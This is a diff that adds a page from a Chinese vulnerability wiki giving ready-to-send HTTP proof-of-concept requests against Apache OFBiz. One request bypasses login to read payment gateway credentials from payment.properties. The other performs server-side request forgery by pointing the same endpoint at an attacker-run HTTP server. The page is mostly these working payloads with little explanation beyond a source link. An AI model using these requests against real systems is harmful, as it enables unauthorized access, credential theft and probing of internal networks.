@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/Apache-OFBiz-SSRF-%26%26-%E4%BB%BB%E6%84%8F%E9%85%8D%E7%BD%AE%E8%AF%BB%E5%8F%96/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache OFBiz SSRF && 任意配置读取 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache OFBiz SSRF \u0026amp;\u0026amp; \u4efb\u610f\u914d\u7f6e\u8bfb\u53d6", url: "#_top", children: [
+          ]},
+          {title: "\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e poc", url: "#poc", children: [
+          ]},
+          {title: "SSRF", url: "#ssrf", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-%28CVE-2023-51467%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-%28CVE-2023-51467%29/" class="btn btn-xs btn-link">
+        Apache OFBiz 身份验证绕过漏洞 (CVE 2023 51467)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-link">
+        Apache Kafka的UI中的远程代码执行CVE 2023 52251
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="apache-ofbiz-ssrf">Apache OFBiz SSRF &amp;&amp; 任意配置读取<a class="headerlink" href="#apache-ofbiz-ssrf" title="Permanent link">&para;</a></h2>
+<h2 id="poc">任意文件读取漏洞 poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>以读取 applications/accounting/config/payment.properties 中的几个 key 为例</p>
+<p><div class="highlight"><pre><span></span><code>POST /webtools/control/getJSONuiLabelArray/?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Cache-Control: no-cache
+Pragma: no-cache
+Host: 
+Content-type: application/x-www-form-urlencoded
+Content-Length: 148
+
+requiredLabels={&quot;file:applications/accounting/config/payment.properties&quot;:[&quot;payment.verisign.user&quot;,&quot;payment.verisign.pwd&quot;,&quot;payment.verisign.vendor&quot;]}
+</code></pre></div>
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/093b6ca3-2917-4607-93a0-efaf2b3e2ca8" /></p>
+<h2 id="ssrf">SSRF<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h2>
+<p>```
+POST /webtools/control/getJSONuiLabelArray/?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Cache-Control: no-cache
+Pragma: no-cache
+Host: 
+Content-type: application/x-www-form-urlencoded
+Content-Length: 148</p>
+<p>requiredLabels={"<a href="http://127.0.0.1/&quot;:[&quot;xxxxxx">http://127.0.0.1/":["xxxxxx</a>"]}
+````</p>
+<p>这里随便写一个 properties 文件，然后 python -m http.server 8000 起个服务
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/683a3f21-0405-43f1-9d51-a44752107432" /></p>
+<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/7f5e826e-9564-4343-bf1e-d0d530ab7a3a" /></p>
+<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/beb30398-fa1b-4028-98f9-b3e8ccb4d90e" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://xz.aliyun.com/t/13211">https://xz.aliyun.com/t/13211</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-%28CVE-2023-51467%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-%28CVE-2023-51467%29/" class="btn btn-xs btn-link">
+        Apache OFBiz 身份验证绕过漏洞 (CVE 2023 51467)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Apache-Kafka%E7%9A%84UI%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2023-52251/" class="btn btn-xs btn-link">
+        Apache Kafka的UI中的远程代码执行CVE 2023 52251
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
